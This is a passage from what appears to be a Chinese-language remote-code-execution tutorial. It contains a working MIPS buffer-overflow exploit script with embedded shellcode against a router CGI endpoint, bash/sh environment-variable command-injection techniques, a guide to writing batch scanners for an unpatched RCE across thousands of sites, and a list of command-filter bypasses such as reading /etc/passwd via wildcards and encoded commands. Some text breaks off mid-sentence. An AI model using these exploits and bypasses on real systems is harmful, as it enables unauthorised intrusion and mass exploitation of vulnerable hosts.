    context.endian = 'little'
    context.os = 'linux'
    libc = 0x2af98000
    jmp_a0 = libc + 0x0003D050 # move  $t9,$a0; jalr  $a0
    jmp_s0 = libc + 0x000257A0 # addiu  $a0,$sp,0x38+var_20 ; jalr  $s0 (var_20) = -20
    buf = b""
    buf += b"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"
    buf += b"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"
    buf += b"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"
    buf += b"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\x54\x0e\x3c"
    buf += b"\x22\x54\xce\x35\xe4\xff\xae\xaf\x01\x65\x0e\x3c\xc0"
    buf += b"\xa8\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"
    buf += b"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"
    buf += b"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"
    buf += b"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"
    buf += b"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"
    buf += b"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"
    buf += b"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"
    buf += b"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"
    buf += b"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"
    buf += b"\x01\x01"
    payload1 = "status_guestnet.asp"
    payload1 += 'a' * 49 + p32(jmp_a0) # control $s0
    payload1 += (85 - 49 - 4) * 'a' + p32(jmp_s0) # control gadgets2 , retuen to jmp_s0
    payload1 += 'a' * 18 + buf # control $sp + 18
    url = "https://192.168.1.1/guest_logout.cgi"
    payload2 = {
       "cmac":"12:af:aa:bb:cc:dd",
       "submit_button": payload1,
       "cip":"192.168.1.100"
    }
    requests.packages.urllib3.disable_warnings() #Hide warnings
    requests.post(url, data=payload2, verify=False,timeout=1)
    p.wait_for_connection()
    log.success("getshell")
    p.interactive()
成功getshell
## **16 php环境变量注入**
某次在P牛的知识星球划水，发现了一个很骚的思路如下
我们可以看到两个点，putenv，传入的参数envs和最后的不可控变量system
这篇文章已经说得很详细了
https://tttang.com/archive/1450/
所以这里只是简单总结，如果想深入研究可以看看这篇帖子
下载源码然后看到这个文件\glibc-2.31\libio\iopopen.c，我们可以在89行看到的执行sh -c，加上p牛的那段代码，最终输出的是sh
-c echo hello
Readfile的目的是读取SHELL中的profile文件
然后我们可以看到这段代码的257行，name被expandstr解析
文章里说，iflag经过分析是表示是否传入-i参数，然后我溯源的时候发现应该是在\dash-0.5.10.2\src\options.h文件和\dash-0.5.10.2\src\options.c文件中定义的
所以后面传参过去-i -c就可以了
    ENV='$(id1>&2)' dash -i -c 'echo hello'
最后经过大佬的分析，在文件variables.c这段代码中
Parse_and_execute执行temp_string
我们可以在bash-4.4-beta2\bash-4.4-beta2\builtins\evalstring.c文件看到该函数
不过其实哪怕看其他几个传参点也能知道parse_and_excute执行的就是shell命令
最后以p牛给的几个途径完结
BASH_ENV：可以在bash -c的时候注入任意命令
ENV：可以在sh -i -c的时候注入任意命令
PS1：可以在sh或bash交互式环境下执行任意命令
PROMPT_COMMAND：可以在bash交互式环境下执行任意命令
BASH_FUNC_xxx%%：可以在bash -c或sh -c的时候执行任意命令
    env 'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"
当然除了这种，还有个LD_PRELOAD，我这里就不复现了，感兴趣的可以看看
## **17 POC/EXP编写**
RCE的原理大家基本都懂了，但比如挖到了0day，基本都是几千个站及以上了，如果刷分的话手测得累死，所以需要自己开发poc进行批量探测
这里先拿一个简单的get传参的rce来写
用一个小0day来做示范，如下
利用payload
    /data/manage/cmd.php?cmd=whoami
可以看到成功回显
那么思路就很清晰了，rce直接用输出的数据，然后判断返回包是否存在，导入request包，然后传参，判断返回包是否存在我们想要的
Exp编写如下：
我们可以看到后面使我们的命令回显，那么我们之前的字符都不需要，所以print出下标和整个html代码
我们可以看到我们的命令回显在=10) :比如ca${21}t a.txt表示cat a.txt 在没有传入参数的情况下,这些特殊字符默认为空,如下:
wh$1oami
who$@ami
whoa$*mi
5.利用未赋值变量绕过
cat /etc$u/passwd
cat$u /etc/passwd
6.通配符绕过
cat /passwd：
??? /e??/?a????
cat /e _/pa_
7.base编码绕过
echo 'Y2F0wqAK' | base64 -d '1.txt'
8.过滤分割符 | & ；
; //分号
| //只执行后面那条命令
|| //只执行前面那条命令
& //两条命令都会执行
&& //两条命令都会执行
%0a //换行符
%0d //回车符号
用?>代替；
在php中可以用?>来代替最后的一个；，因为php遇到定界符关闭标签会自动在末尾加上一个分号
9.远程下载/复制绕过
Copy，wget，curl等函数，不直接写入文件，而是远程下载来保存文件
当然除了这些肯定还有很多绕过方法，不过本篇文章不着重于此处，可自行搜索
文章中部分是互联网的案例与素材，上上下下看了快几百个网站进行资料查找，问了很多大佬，全程自己打字写所以肯定会有错误，看到有技术性错误私聊我进行修改or删除，因为参考站点太多了，这里就不一一写引用了，如有侵权请私信我修改or删除
* * *